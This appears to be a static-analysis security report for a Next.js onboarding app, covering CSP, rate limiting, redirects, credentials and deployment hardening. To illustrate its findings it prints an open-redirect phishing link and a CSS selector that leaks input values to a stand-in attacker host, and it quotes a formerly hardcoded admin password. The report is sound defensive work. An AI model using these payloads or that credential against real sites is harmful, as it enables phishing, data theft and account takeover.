# Security Assessment Report — OnboardingApp

**Date:** 2026-03-23
**Scope:** Full codebase review — authentication, authorisation, input handling, file upload, session management, cryptography, HTTP headers, rate limiting, secrets management, logging, and deployment configuration.
**Basis:** Independent static analysis of all source files. No prior report consulted.

---

## Executive Summary

The application demonstrates a strong overall security posture with consistent, layered controls. Authentication, database access, file upload validation, HTML sanitisation, and cryptographic practices are all well-implemented. Three critical and four high-severity issues were identified at initial assessment; all three critical findings have since been resolved.

**Findings overview:**

| Severity | Total | Open | Resolved |
|----------|-------|------|----------|
| Critical | 3 | 0 | 3 |
| High | 4 | 4 | 0 |
| Medium | 8 | 7 | 1 |
| Low | 5 | 5 | 0 |
| Informational | 3 | — | — |

---

## Findings

---

### CRIT-01 — CSP defeats its own XSS protection via `unsafe-inline` and `unsafe-eval`

**Status: Resolved** — commit `6b1f0e5`

**File:** `next.config.js`

**Detail:**
The Content Security Policy included:
```
script-src 'self' 'unsafe-inline' 'unsafe-eval'
```

`unsafe-inline` permits any inline `<script>` block and inline event handlers (`onerror`, `onclick`, etc.) to execute. `unsafe-eval` permits `eval()`, `new Function()`, and `setTimeout(string)`. Together they completely eliminate the XSS protection CSP is designed to provide. Any future HTML injection vulnerability — in course content rendering, branding, or any other surface — can be immediately escalated to arbitrary JavaScript execution.

**Resolution:**
The static `headers()` block was removed from `next.config.js`. All security headers (including CSP) now originate in `middleware.ts`, where a cryptographically random nonce is generated per request via `Buffer.from(crypto.randomUUID()).toString('base64')`. The CSP is:
```
script-src 'self' 'nonce-{nonce}' 'strict-dynamic'
style-src 'self' 'nonce-{nonce}'
```
`unsafe-eval` and `unsafe-inline` are eliminated from both directives. `'strict-dynamic'` allows Next.js to load chunks dynamically from nonce-trusted scripts without any wildcard. The nonce is forwarded to server components via the `x-nonce` request header; `app/layout.tsx` reads it and applies it to the branding `<style>` block. This also resolves MED-03 (see below).

---

### CRIT-02 — Default admin password hardcoded in seed file committed to git

**Status: Resolved** — commit `f359e52`

**File:** `prisma/seed.ts:7`

**Detail:**
```typescript
const passwordHash = await argon2.hash('T34mw0rk!', { ... })
```

The plaintext password `T34mw0rk!` is committed to the git repository and is therefore part of the permanent history. The seed runs on every container startup (via `docker-entrypoint.sh`). Any attacker with read access to the repository knows the initial admin credential for every deployment.

**Resolution:**
The hardcoded password and the `upsert` pattern are replaced with an explicit existence check. On first boot, if no admin user exists, the seed reads `ADMIN_BOOTSTRAP_PASSWORD` from the environment; if absent, it generates `randomBytes(12).toString('base64url')` and prints it once to stdout. On subsequent boots it detects the existing admin and exits without touching credentials. The Argon2id parameters are unchanged. `ADMIN_BOOTSTRAP_PASSWORD` is documented in `.env.example`.

Note: `T34mw0rk!` remains in git history. Any deployment initialised before this fix must have the admin password changed manually.

---

### CRIT-03 — In-memory rate limiting is ineffective across multiple instances

**Status: Resolved** — commit `a87bee3`

**File:** `lib/ratelimit.ts`

**Detail:**
All rate limiters used `RateLimiterMemory`, which stores counters in the Node.js process heap. In any load-balanced or auto-scaled deployment (multiple Docker replicas, Kubernetes pods, etc.), each instance maintains independent counters. An attacker can fully bypass every limit — including the login brute-force limit — by distributing requests across instances. Each instance will allow the full quota individually.

This affects the login limiter (10 attempts / 15 min per IP), the factory reset limiter (3/hour), and all per-user write-operation limiters.

**Resolution:**
A `makeLimiter` factory in `lib/ratelimit.ts` returns `RateLimiterRedis` when `REDIS_URL` is set, or `RateLimiterMemory` with a startup warning otherwise. All 21 limiters are created through this factory; each is assigned a unique `keyPrefix` to prevent key collisions in Redis. A Redis 7-alpine service is added to `docker-compose.yml` with a healthcheck; the app service depends on `service_healthy` before starting. `lib/redis.ts` holds the shared `ioredis` client. The fallback to memory is intentional for single-instance local development but is logged visibly so operators are never silently running without Redis in production. All existing tests continue to pass because they mock `@/lib/ratelimit` entirely.

---

### HIGH-01 — Open redirect in login callback URL

**Files:** `app/(auth)/login/LoginForm.tsx:12`, `middleware.ts:22`

**Detail:**
The login form reads `callbackUrl` from the query string and redirects to it on successful authentication:
```typescript
const callbackUrl = searchParams.get('callbackUrl') ?? '/dashboard'
// ...
router.push(callbackUrl)
```

There is no validation that `callbackUrl` is a relative path on the same origin. An attacker can craft a login link such as:
```
https://app.example.com/login?callbackUrl=https://attacker.com/fake-login
```
After the user authenticates, they are silently redirected to the attacker's domain. This is a phishing vector: the attacker's page can mimic the app and prompt for credentials a second time.

The middleware that sets the `callbackUrl` parameter also performs no validation:
```typescript
loginUrl.searchParams.set('callbackUrl', pathname)
```

**Recommendation:**
Validate that `callbackUrl` is a relative path before using it:
```typescript
function isSafeCallback(url: string): boolean {
  return url.startsWith('/') && !url.startsWith('//')
}
const callbackUrl = isSafeCallback(searchParams.get('callbackUrl') ?? '')
  ? searchParams.get('callbackUrl')!
  : '/dashboard'
```
Apply the same check in middleware before setting the parameter.

---

### HIGH-02 — Open redirect in document and attachment download for web links

**Files:** `app/api/documents/[documentId]/download/route.ts:60`, `app/api/attachments/[attachmentId]/download/route.ts`

**Detail:**
When a document record has a non-null `url` field, the download route redirects to it unconditionally:
```typescript
if (document.url) {
  return NextResponse.redirect(document.url, { status: 302 })
}
```

No validation is performed on the protocol or host of the stored URL. A URL such as `javascript:alert(1)`, `data:text/html,...`, or `https://attacker.com` stored in the database — whether through a compromised HR account or a future injection — would be followed by authenticated users' browsers.

**Recommendation:**
Validate the URL scheme before redirecting:
```typescript
if (document.url) {
  try {
    const parsed = new URL(document.url)
    if (parsed.protocol !== 'https:') {
      return NextResponse.json({ error: 'Invalid document URL' }, { status: 400 })
    }
  } catch {
    return NextResponse.json({ error: 'Invalid document URL' }, { status: 400 })
  }
  return NextResponse.redirect(document.url, { status: 302 })
}
```

---

### HIGH-03 — Password reset returns plaintext credential in JSON response body

**File:** `app/api/users/[userId]/reset-password/route.ts:77`

**Detail:**
The password reset endpoint returns the generated temporary password in the response body:
```typescript
return NextResponse.json({ tempPassword }, { status: 200 })
```

The response does not include `Cache-Control: no-store`. This means the plaintext credential is:
- Visible in application HTTP access logs and reverse proxy logs
- Stored in browser developer-tools Network history
- Potentially cached by intermediate proxies

If an admin's workstation, browser, or any log pipeline is compromised, all temporary passwords ever issued are exposed.

**Recommendation:**
At minimum, add `Cache-Control: no-store, max-age=0` to the response and document that the admin must transmit the password via a secure out-of-band channel. The secure implementation is a token-based reset flow: generate a single-use, time-limited (e.g. 15-minute) reset token, store its hash in the database, and return a reset link. The user sets their own password by presenting the token.

---

### HIGH-04 — `verifyActiveSession` missing at route entry in email test endpoint

**File:** `app/api/admin/email-settings/test/route.ts`

**Detail:**
Every other authenticated API route calls `verifyActiveSession(session.user.id)` immediately after the role check, before any business logic executes. The email test route does not follow this pattern. It re-checks the admin's active status inline before sending the test email, but only after fetching the user record for a different purpose:

```typescript
// Active check buried deep in business logic — not at route entry
const adminUser = await prisma.user.findUnique({ where: { id: session.user.id }, ... })
if (!adminUser || !adminUser.active) { ... }
```

This inconsistency means a deactivated admin can trigger this route and reach the email-sending code before being blocked. It also means the pattern is not uniformly enforced — a future developer may not notice the inline check and assume the route follows the standard pattern.

**Recommendation:**
Add the standard active session check immediately after the role check:
```typescript
if (!await verifyActiveSession(session.user.id)) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}
```

---

### MED-01 — Role enum cast without runtime validation throughout API routes

**Files:** All API route handlers

**Detail:**
Every route that performs an authorisation check casts the session role with `as Role`:
```typescript
if (!canManageCourses(session.user.role as Role)) { ... }
```

This TypeScript cast is erased at runtime. If the JWT contains an unexpected role string — due to a tampered token, a database anomaly, or a future schema change — the cast silently accepts it. The `hasRole()` function calls `ROLE_ORDER.indexOf(role)`, which returns `-1` for unrecognised values. A role of `-1` will fail all `>=` comparisons, causing silent denial rather than an alertable error. More dangerously, a future refactor could change this behaviour.

**Recommendation:**
Validate the role at the point of use before casting:
```typescript
if (!Object.values(Role).includes(session.user.role as Role)) {
  return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
}
const role = session.user.role as Role
```
Or centralise this in a helper that throws on invalid role.

---

### MED-02 — IP-based rate limiting trusts `X-Forwarded-For` unconditionally

**Files:** `app/api/auth/[...nextauth]/route.ts`, `app/api/branding/logo/route.ts`

**Detail:**
Both the login rate limiter and the public logo limiter key on the client IP extracted from the `X-Forwarded-For` header:
```typescript
const ip =
  req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ??
  req.headers.get('x-real-ip') ??
  'unknown'
```

If the application is accessed directly (not through a trusted reverse proxy), an attacker can set any value in `X-Forwarded-For`:
```
X-Forwarded-For: 1.2.3.4
```
Their requests are then rate-limited under the spoofed IP, bypassing both the login brute-force limit and the logo endpoint limit entirely.

**Recommendation:**
Only trust `X-Forwarded-For` when the direct connection originates from a known trusted proxy. In the Docker Compose setup the app should only be reachable from the proxy container. Add a `TRUST_PROXY` environment variable and only read `X-Forwarded-For` when it is set. Document that the reverse proxy must be configured to strip or override this header from external requests.

---

### MED-03 — CSP `unsafe-inline` in style-src allows CSS-based data exfiltration

**Status: Resolved** — commit `6b1f0e5` (resolved as part of CRIT-01)

**File:** `next.config.js`

**Detail:**
```
style-src 'self' 'unsafe-inline'
```

`unsafe-inline` for styles allows an attacker who can inject HTML to inject arbitrary CSS. Modern CSS attribute selectors can exfiltrate data without JavaScript:
```css
input[value^="a"] { background: url(https://attacker.com/leak?c=a) }
```
This attack can extract CSRF tokens, input values, or other DOM content character by character.

**Resolution:**
The CRIT-01 fix replaces `style-src 'self' 'unsafe-inline'` with `style-src 'self' 'nonce-{nonce}'`. The only inline style block (branding CSS custom properties in `app/layout.tsx`) is updated to carry the nonce attribute. `unsafe-inline` is no longer present in any CSP directive.

---

### MED-04 — CSP `img-src` permits images from any HTTPS origin

**File:** `next.config.js`

**Detail:**
```
img-src 'self' data: blob: https:
```

The `https:` keyword allows the browser to load images from any HTTPS URL. This means:
- Injected content can embed tracking pixels from attacker-controlled servers (exfiltrates browser fingerprint, session timing)
- If course HTML is improperly sanitised in a future regression, external image URLs can exfiltrate query-string data

**Recommendation:**
Restrict `img-src` to an explicit allowlist of trusted origins used by the application. If no external images are required in practice outside of course content, restrict to `'self' data: blob:` and document the decision.

---

### MED-05 — `EMAIL_ENCRYPTION_KEY` not documented in `.env.example`

**File:** `.env.example`

**Detail:**
`lib/encrypt.ts` requires `EMAIL_ENCRYPTION_KEY` to be a 64-character hex string (32 bytes). If this variable is absent, the application throws at runtime whenever email settings are accessed. The variable is not included in `.env.example`, so a deployer following the template will not know it exists until the application fails.

**Recommendation:**
Add to `.env.example`:
```
# Required if using email (SMTP or Entra). Generate with:
# node -e "process.stdout.write(require('crypto').randomBytes(32).toString('hex'))"
EMAIL_ENCRYPTION_KEY=CHANGE_ME_64_HEX_CHARS
```

---

### MED-06 — Application port bound to all host interfaces in Docker Compose

**File:** `docker-compose.yml`

**Detail:**
```yaml
ports:
  - "3000:3000"
```

This binds port 3000 on `0.0.0.0`, making the application directly accessible on all network interfaces of the host. On a cloud VM or server with a public IP address, the app is reachable from the internet without TLS termination. All session cookies and data are transmitted in plaintext; the `Secure` cookie flag and HSTS header are ineffective without HTTPS.

**Recommendation:**
In production, bind only to localhost:
```yaml
ports:
  - "127.0.0.1:3000:3000"
```
Route external HTTPS traffic through a reverse proxy (Nginx, Caddy, Traefik) that terminates TLS and forwards to `127.0.0.1:3000`.

---

### MED-07 — Entra OAuth access token cached in process memory

**File:** `lib/email.ts`

**Detail:**
```typescript
let entraTokenCache: { accessToken: string; expiresAt: number } | null = null
```

When the Entra email provider is configured, a live Microsoft Graph API access token is stored in a module-level variable for up to ~55 minutes. A process memory dump or a heap-inspection attack would expose this token. The token grants the ability to send email as the configured sender for its remaining lifetime.

**Recommendation:**
For current single-instance deployments this is an acceptable risk given the short token lifetime. Document the exposure window. If multi-instance deployment is implemented, move the cache to Redis with appropriate TTL.

---

### MED-08 — Session cookie transmitted over HTTP in non-production environments

**File:** `auth.config.ts`

**Detail:**
```typescript
secure: process.env.NODE_ENV === 'production'
```

The `Secure` cookie flag is only set when `NODE_ENV` is `production`. If the application is accidentally deployed with `NODE_ENV` not set to `production` (e.g. a misconfigured staging environment), session tokens are transmitted in plaintext over HTTP.

**Recommendation:**
This is acceptable for intentional local development. Ensure deployment pipelines enforce `NODE_ENV=production` and verify the flag is present in production by inspecting Set-Cookie response headers after deployment.

---

### LOW-01 — No CSP violation reporting configured

**File:** `next.config.js`

**Detail:**
The Content Security Policy does not include a `report-uri` or `report-to` directive. CSP violations — whether caused by a misconfiguration or an active attack — are silently discarded by the browser. There is no visibility into what is being blocked or attempted.

**Recommendation:**
Add a `report-uri` directive pointing to a logging endpoint. A minimal implementation can log the browser-generated violation report to `AppLog`.

---

### LOW-02 — Task completion (PATCH `/api/tasks`) has no rate limit

**File:** `app/api/tasks/route.ts`

**Detail:**
The PATCH handler that marks tasks complete does not call any rate limiter. Every other user-facing write operation in the application is rate-limited. While task completion is not resource-intensive, the inconsistency means this endpoint has no abuse throttle.

**Recommendation:**
Add a per-user rate limit (e.g. 60 completions per minute) consistent with other user-facing operations.

---

### LOW-03 — Recipient email address included in error log metadata

**File:** `lib/email.ts:200`

**Detail:**
```typescript
logError({
  message: 'Email send failed',
  action: 'email_send',
  meta: { error: String(err), to },
})
```

When email delivery fails, the recipient address is written to the `AppLog` table and to stdout. Depending on the organisation's privacy policy, logging personally identifiable information (email addresses) in error logs may require explicit documentation or additional controls (e.g. log access restrictions, retention limits).

**Recommendation:**
Omit the `to` field from the error log, or replace it with a hash for correlation without storing the plaintext address.

---

### LOW-04 — Inconsistent CUID validation on some route ID parameters

**Files:** `app/api/tasks/[taskId]/route.ts` (GET, DELETE)

**Detail:**
Some routes validate path parameter IDs with the `validateCuid()` helper (which enforces the regex `/^c[a-z0-9]{24}$/`). Others check only that the string is non-empty. Prisma will fail gracefully on an invalid ID, but the inconsistency means some routes return Prisma-generated error messages rather than structured validation errors, and the defence-in-depth layer is absent.

**Recommendation:**
Apply `validateCuid()` to all route path parameters that accept database IDs, consistent with the majority of routes.

---

### LOW-05 — No pagination on bulk read endpoints accessible to HR+

**Files:** `app/api/courses/route.ts` (GET), `app/api/workflows/route.ts` (GET), `app/api/tasks/route.ts` (GET)

**Detail:**
These endpoints return all records without pagination. At scale (thousands of tasks, courses, or workflows) the responses will be large and unbounded, causing increased memory usage, slower response times, and potential denial of service for the server or client.

**Recommendation:**
Add `page` and `limit` query parameters with bounded defaults (e.g. `limit` capped at 100) consistent with the pattern used in `GET /api/admin/logs`.

---

### INFO-01 — JWT role is stale for up to 8 hours after role changes

**File:** `auth.config.ts`
**Severity:** Informational (accepted behaviour, documented)

The user's role is encoded in the JWT at login time and is not refreshed from the database mid-session. A role change (e.g. HR → USER) takes effect only when the JWT expires and the user logs in again. This is the inherent stateless JWT trade-off and is acceptable given the 8-hour session window, but operators must be aware that role downgrades are not immediate.

---

### INFO-02 — `trustHost: true` requires correct reverse proxy configuration

**File:** `auth.config.ts`
**Severity:** Informational

`trustHost: true` instructs Auth.js to trust the `Host` and `X-Forwarded-Host` headers when constructing callback URLs. If the application is exposed directly to the internet without a proxy that validates the Host header, this is a host header injection vector. The reverse proxy must be configured not to forward arbitrary `Host` headers and to explicitly set `X-Forwarded-Host` to the canonical domain.

---

### INFO-03 — Internal log messages distinguish login failure reasons

**File:** `lib/auth.ts`
**Severity:** Informational

The access log messages differ between the two login failure cases:
- `'login failed: user not found or inactive'`
- `'login failed: invalid password'`

There is no external enumeration risk — the response to the client is identical in both cases. However, if logs are ever exposed externally or to a compromised account, these messages leak whether a given username exists in the system.

---

## Controls Verified as Correctly Implemented

The following areas were reviewed and found to meet or exceed security best practices:

**Authentication**
- Argon2id with `m=65536, t=3, p=4` (NIST-approved parameters)
- Constant-time dummy hash verification on unknown usernames to prevent timing attacks
- Input length limits (128-char username, 256-char password) to prevent DoS via hash computation

**Session management**
- JWT signed with `AUTH_SECRET`; 8-hour expiry
- `HttpOnly`, `SameSite=Strict`, `Secure` (production), `__Secure-` prefix (production)
- `verifyActiveSession` DB check on every authenticated API route compensates for JWT trust gap

**CSRF protection**
- `SameSite=Strict` cookie prevents cross-site request forgery on all state-changing requests
- CSP `form-action 'self'` restricts form submissions to same origin
- Auth.js built-in CSRF token for its own auth routes

**Authorisation**
- Role check on every API route — no unprotected authenticated endpoints
- Supervisor scope enforced via DB join (WorkflowTask → UserWorkflow) not just role check
- TOCTOU-safe approval processing using a Prisma database transaction with re-read
- `isCorrect` field never returned to course-taking users — server-side scoring only
- Certificate access gated to own attempt or SUPERVISOR+

**Database access**
- All queries use Prisma's parameterised API — no SQL concatenation
- IDs validated against CUID format before use in queries on most routes
- Selective column projection (`select`) prevents over-fetching sensitive fields

**File upload**
- Magic-byte (`file-type` library) validation — extension alone is never trusted
- Strict allowlist: PDF, DOCX, PNG, JPEG only
- 25 MB hard limit enforced before magic-byte check
- UUID-based storage filenames — original name never used for filesystem access
- Path traversal defence on `storagePath` (separator and `..` rejection) at every read/write/delete
- Files written with mode `0o640`

**HTML sanitisation**
- `sanitize-html` with explicit tag and attribute allowlist for course content
- `rel="noopener noreferrer"` added to all links via `transformTags`
- 200 KB size limit on course HTML before storage
- Sanitisation applied both on write (to database) and on serve (defence in depth)

**Secrets management**
- SMTP password and Entra client secret encrypted at rest with AES-256-GCM
- 96-bit random IV per encryption, 128-bit GCM authentication tag
- `EMAIL_ENCRYPTION_KEY` validated to exactly 32 bytes on every use — fails closed if absent or malformed
- Encrypted secrets never returned in API responses (boolean `passwordSet` flag only)

**HTTP security headers**
- `X-Frame-Options: DENY` — prevents clickjacking
- `X-Content-Type-Options: nosniff` — prevents MIME sniffing (also set on file download responses)
- `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` — 2-year HSTS
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy` — disables camera, microphone, geolocation
- CSP `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`
- CSP `script-src 'self' 'nonce-{nonce}' 'strict-dynamic'` and `style-src 'self' 'nonce-{nonce}'` — no `unsafe-inline` or `unsafe-eval` (resolved CRIT-01 / MED-03)

**Rate limiting**
- Login: 10 attempts / 15 min per IP (plus 15-min block)
- File upload: 10 / min per user
- Course attempts: 20 / hour per user (prevents quiz answer brute-forcing)
- Factory reset: 3 / hour per admin
- Log reads: 30 / min per admin
- All sensitive write operations covered
- All 21 limiters use `RateLimiterRedis` when `REDIS_URL` is set, `RateLimiterMemory` otherwise (resolved CRIT-03)

**Error handling and logging**
- Generic error messages to clients; detailed context logged internally
- Log metadata scrubbed for keys containing: password, token, hash, secret, credential, auth
- Structured JSON to stdout (suitable for log aggregation)
- Async DB log write never propagates failures to callers

**Docker and deployment**
- Application runs as non-root `nextjs` user (UID 1001)
- Multi-stage Dockerfile; only compiled output in runtime image (Alpine base)
- `prisma migrate deploy` runs automatically on container start
- Named Docker volumes for data persistence across restarts
- Health check on the database service prevents app starting before DB is ready
- Redis 7-alpine service with healthcheck; app depends on `service_healthy` (resolved CRIT-03)

---

## Pre-Deployment Checklist

- [x] **Change the default admin password** — CRIT-02 resolved; seed now generates or reads password from env, never hardcodes it. Deployments initialised before commit `f359e52` must change the password manually.
- [ ] **Generate a strong `AUTH_SECRET`** — minimum 32 random bytes: `openssl rand -base64 32`
- [ ] **Generate `EMAIL_ENCRYPTION_KEY`** — 32 random bytes as hex: `node -e "process.stdout.write(require('crypto').randomBytes(32).toString('hex'))"`
- [ ] **Generate `CRON_SECRET`** — minimum 32 random bytes
- [ ] **Deploy behind a TLS-terminating reverse proxy** (Nginx, Caddy, or similar)
- [ ] **Bind app port to localhost only** (`127.0.0.1:3000:3000`) — address MED-06
- [ ] **Configure reverse proxy** to set `X-Forwarded-For` correctly and not forward arbitrary Host headers (required for INFO-02 and MED-02)
- [ ] **Set `NEXTAUTH_URL`** to the exact public URL (including `https://`) — required for CSRF and cookie security
- [ ] **Set `NODE_ENV=production`** — enables `__Secure-` cookie prefix and `Secure` flag
- [ ] **Set `LOG_LEVEL=ACCESS`** or `LOG_LEVEL=ERROR` in production to reduce log volume
- [ ] **Plan AppLog retention** — implement deletion of rows older than 90 days
- [x] **CRIT-01 resolved** — nonce-based CSP in middleware; `unsafe-inline`/`unsafe-eval` removed (commit `6b1f0e5`)
- [x] **CRIT-02 resolved** — hardcoded seed password replaced with env var or generated random (commit `f359e52`)
- [x] **CRIT-03 resolved** — Redis-backed rate limiters with `RateLimiterRedis`; Redis service in Docker Compose (commit `a87bee3`)
- [ ] **Address HIGH-01** — validate `callbackUrl` parameter before internet-facing deployment
- [ ] **Address HIGH-02** — validate web link URL scheme before internet-facing deployment
- [ ] **Configure a log aggregator** (Datadog, Loki, CloudWatch) to ingest container stdout in JSON parse mode
- [ ] **Review and restrict network access** — the PostgreSQL port must not be exposed outside the Docker network

---

*Initial assessment: commit `667aefd` (2026-03-23). CRIT-01/MED-03 resolved: commit `6b1f0e5`. CRIT-02 resolved: commit `f359e52`. CRIT-03 resolved: commit `a87bee3`. Report last updated: 2026-03-23. Covers static analysis only. Dynamic testing (DAST), penetration testing, and dependency vulnerability scanning (beyond `npm audit`) are recommended as separate activities before go-live.*
